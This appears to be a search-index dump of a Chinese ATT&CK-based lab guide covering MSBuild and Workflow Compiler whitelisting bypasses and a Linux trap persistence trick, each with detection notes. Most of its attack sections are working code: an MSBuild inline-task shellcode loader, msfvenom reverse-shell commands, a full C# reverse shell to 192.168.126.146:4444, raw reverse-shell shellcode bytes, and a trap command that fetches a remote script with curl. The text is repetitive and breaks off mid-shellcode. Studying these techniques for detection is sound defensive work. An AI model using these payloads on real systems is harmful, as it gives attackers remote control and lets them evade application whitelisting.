\u8bf4\u660e\uff1aMsbuild.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMsbuild\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09\u636e\u79f0\u53ef\u4ee5\u7ed5\u8fc7360\uff0c\u5f85\u786e\u8ba4","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u6d4b\u8bd5\u8fc7\u7a0b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#msf","text":"msfvenom -a x86 \u2013platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp","title":"MSF\u751f\u6210\u8f7d\u8377"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#xml","text":"<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"> <!-- This inline task executes shellcode. --> <!-- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe SimpleTasks.csproj --> <!-- Save This File And Execute The Above Command --> <!-- Author: Casey Smith, Twitter: @subTee --> <!-- License: BSD 3-Clause --> <Target Name=\"Hello\"> <ClassExample /> </Target> <UsingTask TaskName=\"ClassExample\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" > <Task> <Code Type=\"Class\" Language=\"cs\"> <![CDATA[ using System; using System.Runtime.InteropServices; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class ClassExample : Task, ITask { private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); public override bool Execute() { byte[] shellcode = new byte[] { \u4f60\u7684payload}; UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return true; } } ]]> </Code> </Task> </UsingTask> </Project>","title":"XML\u6587\u4ef6\u8bbe\u7f6e"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_6","text":"use exploit/multi/handler msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp msf exploit(multi/handler) > set lhost 192.168.126.146 msf exploit(multi/handler) > set lport 4444 msf exploit(multi/handler) > exploit","title":"\u8bbe\u7f6e\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#payload","text":"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe file.xml","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_7","text":"","title":"\u67e5\u770b\u4f1a\u8bdd"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_8","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_9","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#_10","text":"MITRE-ATT&CK-T1127 https://attack.mitre.org/techniques/T1127/ \u5229\u7528msbuild.exe\u7ed5\u8fc7\u5e94\u7528\u7a0b\u5e8f\u767d\u540d\u5355\u5b89\u5168\u673a\u5236\u7684\u591a\u79cd\u59ff\u52bf https://www.freebuf.com/articles/network/197706.html GreatSCT|MSF|\u767d\u540d\u5355 http://www.secist.com/archives/6082.html \u5bf9\u4eae\u795e\u57fa\u4e8e\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload\u7b2c\u4e00\u5b63\u590d\u73b0 https://blog.csdn.net/ws13129/article/details/89736941 \u68c0\u6d4b\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload https://blog.csdn.net/qq_36334464/article/details/105487176 \u57fa\u4e8e\u767d\u540d\u5355\u6267\u884cpayload https://www.jianshu.com/p/cdb1867c6abb","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/","text":"T1154-linux-trap \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u8be5 trap \u547d\u4ee4\u5141\u8bb8\u7a0b\u5e8f\u548cshell\u6307\u5b9a\u5728\u63a5\u6536\u4e2d\u65ad\u4fe1\u53f7\u65f6\u5c06\u6267\u884c\u7684\u547d\u4ee4\u3002\u5e38\u89c1\u7684\u60c5\u51b5\u662f\u811a\u672c\u5141\u8bb8\u6b63\u5e38\u7ec8\u6b62\u548c\u5904\u7406\u5e38\u89c1\u7684\u952e\u76d8\u4e2d\u65ad\uff0c\u5982 ctrl+c \u548c ctrl+d \u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u6ce8\u518c\u5f53shell\u9047\u5230\u7279\u5b9a\u4e2d\u65ad\u4ee5\u6267\u884c\u6216\u4f5c\u4e3a\u6301\u4e45\u6027\u673a\u5236\u65f6\u8981\u6267\u884c\u7684\u4ee3\u7801\u3002\u9677\u9631\u547d\u4ee4\u5177\u6709\u4ee5\u4e0b\u683c\u5f0f trap 'command list' signals \uff0c\u5176\u4e2d\u5f53\u63a5\u6536\u5230\u201c\u4fe1\u53f7\u201d\u65f6\u5c06\u6267\u884c\u201c\u547d\u4ee4\u5217\u8868\u201d\u3002 \u6d4b\u8bd5\u6848\u4f8b trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh # \u811a\u672c\u5373\u4f7f\u5728\u9000\u51fa\u540e\uff08ctrl + c\uff09\u4e5f\u4f1a\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f/\u811a\u672c\u3002 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh \u5173\u4e8etrap\u3001nohup\u547d\u4ee4\u7684\u66f4\u591a\u89e3\u91ca\uff0c\u4f60\u53ef\u4ee5\u67e5\u770b\u53c2\u8003\u94fe\u63a5\u90e8\u5206\u3002 \u68c0\u6d4b\u65e5\u5fd7 bash\u5386\u53f2\u547d\u4ee4 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/$ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh > ^C \u6d4b\u8bd5\u7559\u75d5 icbc@icbc:/$ history 693 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 index=linux sourcetype=bash_history \"trap *\" | table host,user_name,bash_command \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1154 https://attack.mitre.org/techniques/T1154/ linux\u4e0btrap\u547d\u4ee4\u8be6\u89e3 https://blog.csdn.net/carolzhang8406/article/details/46504415/ linux\u4e0bnohup\u547d\u4ee4\u6d45\u6790 https://www.bbsmax.com/A/kjdw9606JN/","title":"T1154-linux-trap"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#t1154-linux-trap","text":"","title":"T1154-linux-trap"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#attck","text":"\u8be5 trap \u547d\u4ee4\u5141\u8bb8\u7a0b\u5e8f\u548cshell\u6307\u5b9a\u5728\u63a5\u6536\u4e2d\u65ad\u4fe1\u53f7\u65f6\u5c06\u6267\u884c\u7684\u547d\u4ee4\u3002\u5e38\u89c1\u7684\u60c5\u51b5\u662f\u811a\u672c\u5141\u8bb8\u6b63\u5e38\u7ec8\u6b62\u548c\u5904\u7406\u5e38\u89c1\u7684\u952e\u76d8\u4e2d\u65ad\uff0c\u5982 ctrl+c \u548c ctrl+d \u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u6ce8\u518c\u5f53shell\u9047\u5230\u7279\u5b9a\u4e2d\u65ad\u4ee5\u6267\u884c\u6216\u4f5c\u4e3a\u6301\u4e45\u6027\u673a\u5236\u65f6\u8981\u6267\u884c\u7684\u4ee3\u7801\u3002\u9677\u9631\u547d\u4ee4\u5177\u6709\u4ee5\u4e0b\u683c\u5f0f trap 'command list' signals \uff0c\u5176\u4e2d\u5f53\u63a5\u6536\u5230\u201c\u4fe1\u53f7\u201d\u65f6\u5c06\u6267\u884c\u201c\u547d\u4ee4\u5217\u8868\u201d\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_1","text":"trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh # \u811a\u672c\u5373\u4f7f\u5728\u9000\u51fa\u540e\uff08ctrl + c\uff09\u4e5f\u4f1a\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f/\u811a\u672c\u3002 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh \u5173\u4e8etrap\u3001nohup\u547d\u4ee4\u7684\u66f4\u591a\u89e3\u91ca\uff0c\u4f60\u53ef\u4ee5\u67e5\u770b\u53c2\u8003\u94fe\u63a5\u90e8\u5206\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_2","text":"bash\u5386\u53f2\u547d\u4ee4","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_3","text":"icbc@icbc:/$ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh > ^C","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_4","text":"icbc@icbc:/$ history 693 trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#splunk","text":"index=linux sourcetype=bash_history \"trap *\" | table host,user_name,bash_command","title":"splunk\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1154-linux-trap/#_7","text":"MITRE-ATT&CK-T1154 https://attack.mitre.org/techniques/T1154/ linux\u4e0btrap\u547d\u4ee4\u8be6\u89e3 https://blog.csdn.net/carolzhang8406/article/details/46504415/ linux\u4e0bnohup\u547d\u4ee4\u6d45\u6790 https://www.bbsmax.com/A/kjdw9606JN/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-001-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload/","text":"T1218-001-win-\u57fa\u4e8e\u767d\u540d\u5355Compiler.exe\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u8bb8\u591a\u8f6f\u4ef6\u5f00\u53d1\u76f8\u5173\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6267\u884c\u5404\u79cd\u5f62\u5f0f\u7684\u4ee3\u7801\u4ee5\u534f\u52a9\u5f00\u53d1\u3001\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u5408\u6cd5\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002\u7b7e\u540d\u540e\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c\u5e76\u901a\u8fc7\u53ef\u4fe1\u7684\u8fdb\u7a0b\u4ee3\u7406\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u6709\u6548\u5730\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u89e3\u51b3\u65b9\u6848\u3002 \u6d4b\u8bd5\u6848\u4f8b Microsoft.Workflow.Comiler.exe\u662f.NET Framework\u9ed8\u8ba4\u81ea\u5e26\u7684\u4e00\u4e2a\u5b9e\u7528\u5de5\u5177\uff0c\u7528\u6237\u80fd\u591f\u4ee5XOML\u5de5\u4f5c\u6d41\u6587\u4ef6\u7684\u5f62\u5f0f\u63d0\u4f9b\u4e00\u4e2a\u5e8f\u5217\u5316\u5de5\u4f5c\u6d41\u6765\u6267\u884c\u4efb\u610f\u672a\u7b7e\u540d\u7684\u4ee3\u7801\u3002 Microsoft.Workflow.Comiler.exe\u9700\u8981\u4e24\u4e2a\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2aXML\u6587\u4ef6\uff08\u7531\u4e00\u4e2a\u5e8f\u5217\u5316CompilerInput\u5bf9\u8c61\u6784\u6210\uff09\u7684\u8def\u5f84\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f\u5199\u5165\u5e8f\u5217\u5316\u7f16\u8bd1\u7ed3\u679c\u7684\u6587\u4ef6\u8def\u5f84\u3002 \u8bf4\u660e\uff1aMicrosoft.Workflow.Compiler.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMicrosoft.Workflow.Compiler\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012 \u65b9\u6cd51 POC.xml <?xml version=\"1.0\" encoding=\"utf\u20108\"?> <CompilerInput xmlns:i=\"http://www.w3.org/2001/XMLSchema\u2010instance\" xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler\" <files xmlns:d2p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"> <d2p1:string>add.tcp</d2p1:string> </files> <parameters xmlns:d2p1=\"http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler\"> <assemblyNames xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <compilerOptions i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <coreAssemblyFileName xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"></coreAssemblyFileName> <embeddedResources xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <evidence xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.Security.Policy\" i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <generateExecutable xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</generateExecutable> <generateInMemory xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">true</generateInMemory> <includeDebugInformation xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</includeDebugInformation> <linkedResources xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <mainClass i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <outputName xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\"></outputName> <tempFiles i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <treatWarningsAsErrors xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">false</treatWarningsAsErrors> <warningLevel xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\">\u20101</warningLevel> <win32Resource i:nil=\"true\" xmlns=\"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler\" /> <d2p1:checkTypes>false</d2p1:checkTypes> <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode> <d2p1:compilerOptions i:nil=\"true\" /> <d2p1:generateCCU>false</d2p1:generateCCU> <d2p1:languageToUse>CSharp</d2p1:languageToUse> <d2p1:libraryPaths xmlns:d3p1=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\" i:nil=\"true\" /> <d2p1:localAssembly xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.Reflection\" i:nil=\"true\" /> <d2p1:mtInfo i:nil=\"true\" /> <d2p1:userCodeCCUs xmlns:d3p1=\"http://schemas.datacontract.org/2004/07/System.CodeDom\" i:nil=\"true\" /> </parameters> </CompilerInput> add.tcp using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Net; using System.Net.Sockets; using System.Workflow.Activities; public class Program : SequentialWorkflowActivity { static StreamWriter streamWriter; public Program() { using(TcpClient client = new TcpClient(\"192.168.126.146\", 4444)) { using(Stream stream = client.GetStream()) { using(StreamReader rdr = new StreamReader(stream)) { streamWriter = new StreamWriter(stream); StringBuilder strInput = new StringBuilder(); Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.CreateNoWindow = true; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardInput = true; p.StartInfo.RedirectStandardError = true; p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); p.Start(); p.BeginOutputReadLine(); while(true) { strInput.Append(rdr.ReadLine()); p.StandardInput.WriteLine(strInput); strInput.Remove(0, strInput.Length); } } } } } private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) { StringBuilder strOutput = new StringBuilder(); if (!String.IsNullOrEmpty(outLine.Data)) { try { strOutput.Append(outLine.Data); streamWriter.WriteLine(strOutput); streamWriter.Flush(); } catch (Exception err) { } } } } \u8bbe\u7f6e\u76d1\u542c use exploit/multi/handler msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp msf exploit(multi/handler) > set lhost 192.168.126.146 msf exploit(multi/handler) > set lport 4444 msf exploit(multi/handler) > exploit \u9776\u673a\u6267\u884cpayload C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe poc.xml add.tcp \u67e5\u770b\u4f1a\u8bdd \u8fdb\u7a0b\u610f\u5916\u7ec8\u6b62\uff0c\u672a\u83b7\u5f97\u4f1a\u8bdd\uff0c\u5229\u7528\u65b9\u6cd52\u8fdb\u884c\u6d4b\u8bd5\u3002 \u65b9\u6cd52 msf\u751f\u6210shellcode msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp using System; using System.Workflow.Activities; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; class yrDaTlg : SequentialWorkflowActivity { [DllImport(\"kernel32\")] private static extern IntPtr VirtualAlloc(UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPt rDStOGXQMMkP, uint CzzIpcuQppQSTBJ, uint JCFImGhkRqtwANx, out uint exgVp Sg); [DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, ref UInt32 SZtdSB); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM); public yrDaTlg() { byte[] QWKpWKhcs = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48, 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9, 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41, 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48, 0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b, 0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b, 0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41, 0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1, 0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45, 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b, 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01, 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48, 0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9, 0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00, 0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5, 0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x7e,0x92,0x41,0x54,0x49,0x89,0xe4, 0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68, 0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a, 0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89, 